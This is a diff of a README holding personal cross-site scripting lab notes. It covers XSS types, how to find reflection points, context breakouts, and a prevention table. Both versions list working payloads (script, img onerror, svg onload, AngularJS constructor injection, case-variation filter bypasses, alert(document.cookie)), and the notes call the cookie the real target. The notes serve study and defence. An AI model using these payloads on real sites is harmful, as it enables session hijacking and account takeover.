@@ -1,115 +1,96 @@
+# 🔀 Cross-Site Scripting (XSS) — Notes & Labs
 
-# Cross-Site Scripting (XSS) – Overview & Notes
-
-Cross-Site Scripting (XSS) is one of the most common and impactful vulnerabilities in web applications.  
-It occurs when an attacker is able to inject and execute arbitrary JavaScript in a victim’s browser.
-
-This repository contains my personal notes and writeups for XSS labs from PortSwigger Web Security Academy, covering both **Reflected**, **Stored**, and **DOM-based** XSS.
+![Category](https://img.shields.io/badge/Category-XSS-red?style=flat-square)
+![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20→%20Practitioner-orange?style=flat-square)
 
 ---
 
-## 🔥 What is XSS?
+## 🧠 What is XSS?
 
-XSS happens when:
-- User-controlled input
-- Is included in a webpage
-- Without proper sanitization or encoding
-- Allowing the attacker to execute JavaScript in the victim’s browser
-
-This can lead to:
-- Session hijacking  
-- Account takeover  
-- Keylogging  
-- CSRF bypass  
-- Full control over the victim’s browser context  
+XSS happens when an attacker injects malicious JavaScript into a web page that gets executed in another user's browser.
+The server trusts the input and reflects it back — the victim's browser runs the attacker's script.
 
 ---
 
-## 🧩 Types of XSS
+## 📋 Types of XSS
 
-### 1. Reflected XSS
-Occurs when malicious input is immediately reflected in the response.
-
-**Example:**
-/search?query=<script>alert(1)</script>
-
-
-
-### 2. Stored XSS
-Payload is stored on the server (e.g., comments, profiles) and executed when viewed by users.
-
-### 3. DOM-Based XSS
-The vulnerability exists entirely in **client-side JavaScript**, not the server.
-
-Example sinks:
-- `document.write()`
-- `innerHTML`
-- `location.search`
-- `eval()`
-- AngularJS expressions (`{{ }}`)
+| Type | How it works |
+|------|-------------|
+| **Reflected** | Payload in the URL/request — reflected immediately in the response |
+| **Stored** | Payload saved in the DB — executes every time the page loads |
+| **DOM-based** | JavaScript in the page processes user input unsafely — never hits the server |
 
 ---
 
-## 🛡️ Common XSS Contexts
+## 🔍 How to Detect It
 
-XSS behavior depends on **where** the input lands:
+**Step 1 — Find reflection points:**
+Enter a unique string like `xsstest123` and look for it in the page source.
 
-| Context | Example | Notes |
-|--------|---------|-------|
-| HTML | `<div>INPUT</div>` | Basic injection |
-| Attribute | `<img src="INPUT">` | Requires breaking quotes |
-| JavaScript | `var x = 'INPUT';` | Requires breaking string |
-| URL | `<a href="INPUT">` | JS URLs possible |
-| AngularJS | `{{ INPUT }}` | Expression injection |
-| DOM | `document.write(INPUT)` | No server involvement |
-
----
-
-## 🧠 General Exploitation Strategy
-
-1. **Identify the sink**  
-   Where does the input end up? HTML? JS? Attribute? Angular?
-
-2. **Identify the context**  
-   Are you inside quotes? Inside a tag? Inside a script?
-
-3. **Break out if needed**  
-   Close the tag, close the string, escape the attribute.
-
-4. **Inject JavaScript**  
-   Using:
-   - `<script>`
-   - `<img onerror>`
-   - `javascript:` URLs
-   - AngularJS expressions
-   - Function constructor (`constructor.constructor`)
-
-5. **Trigger execution**  
-   Ensure the payload actually runs.
-
----
-
-## 🧪 Example Payloads
-
-### Basic HTML XSS
+**Step 2 — Check if it's inside HTML, attribute, or JS context:**
 ```html
+<!-- HTML context -->
+<p>xsstest123</p>
+
+<!-- Attribute context -->
+<input value="xsstest123">
+
+<!-- JS context -->
+var x = 'xsstest123';
+```
+
+**Step 3 — Break out of the context and inject:**
+```html
+<!-- HTML context -->
 <script>alert(1)</script>
-```
-Attribute Injection
-```html
-" onerror="alert(1)
-```
-JavaScript Context
-```javascript
 
-';alert(1);//
-```
-AngularJS Expression Injection
-```html
-{{constructor.constructor('alert(1)')()}}
-```
-DOM XSS (document.write)
-```html
-</select><img src=x onerror=alert(1)>
+<!-- Attribute context -->
+" onmouseover="alert(1)
+
+<!-- JS context -->
+';alert(1)//
 ```
 
+---
+
+## 💉 Common Payloads
+
+```html
+<!-- Basic -->
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+
+<!-- Attribute escape -->
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+
+<!-- Filter bypass -->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+
+<!-- Case variation bypass -->
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+```
+
+---
+
+## ✅ Key Takeaways
+
+- Always identify the context first (HTML / attribute / JS) before choosing a payload
+- `<script>` tags are often filtered — `<img>` and `<svg>` are great alternatives
+- DOM XSS never reaches the server — traditional scanners often miss it
+- `document.cookie` is the real target — `alert(1)` just proves execution
+
+---
+
+## 🛡️ How to Prevent XSS
+
+| Fix | Description |
+|-----|-------------|
+| Output Encoding | Encode `<`, `>`, `"`, `'` before rendering |
+| Content Security Policy (CSP) | Restrict what scripts can execute |
+| HttpOnly Cookies | Prevents JS from reading session cookies |
+| Input Validation | Reject unexpected characters at input |
